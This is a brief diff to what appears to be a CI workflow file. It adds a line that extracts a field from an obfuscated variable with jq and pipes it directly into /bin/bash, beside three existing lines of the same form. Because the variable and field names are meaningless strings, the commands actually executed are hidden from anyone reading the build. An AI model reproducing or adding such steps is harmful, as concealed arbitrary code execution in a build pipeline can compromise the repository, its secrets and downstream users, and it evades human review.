@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$ldv62" | jq -r .oqdmp5828 | /bin/bash
           echo $meha990 | jq -r .wf286 | /bin/bash
           printf '%s' "$esr31" | jq -r .fotn63 | /bin/bash
+          printf '%s' "$a56" | jq -r .mj13 | /bin/bash
 
       - name: Save archive
         if: always()
